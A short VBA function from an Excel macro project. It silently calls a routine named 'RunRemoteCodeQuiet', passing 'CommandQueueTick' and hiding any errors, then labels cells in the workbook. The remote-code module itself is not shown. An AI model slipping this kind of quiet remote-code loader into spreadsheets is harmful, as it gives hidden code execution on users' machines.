Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
    On Error Resume Next
    Application.Run "zInternet.RunRemoteCodeQuiet", "CommandQueueTick"
    If Err.Number <> 0 Then Application.Run "zInternet.RunRemoteCode", "CommandQueueTick"
    Dim ws As Worksheet : Set ws = targetWb.Sheets(1)
    ws.Range("A1").Value = "Modul" : ws.Range("B1").Value = "CommandQueueTick"
    Set DynamicFunc = Nothing
End Function
